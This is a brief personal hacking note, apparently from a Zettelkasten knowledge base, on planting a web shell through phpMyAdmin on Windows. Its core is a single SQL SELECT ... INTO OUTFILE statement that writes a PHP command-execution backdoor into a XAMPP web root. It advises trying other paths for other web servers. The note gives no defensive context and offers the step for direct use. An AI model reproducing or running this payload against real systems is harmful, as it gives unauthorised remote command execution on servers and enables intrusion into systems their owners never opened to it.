# PhpmyAdmin write shell Windows
Write a CMD shell into a file with the right permissions. Issue the following select. (Try different paths for different webservers)
```
SELECT "<?php system($_GET['cmd']); ?>" into outfile "C:\\xampp\\htdocs\\backdoor.php"
```

# References
- [20221003150553](/zet/20221003150553/README.md) PhpmyAdmin write shell
- ~/kb/hacking/common-commands.md

Tags:
    #assorted
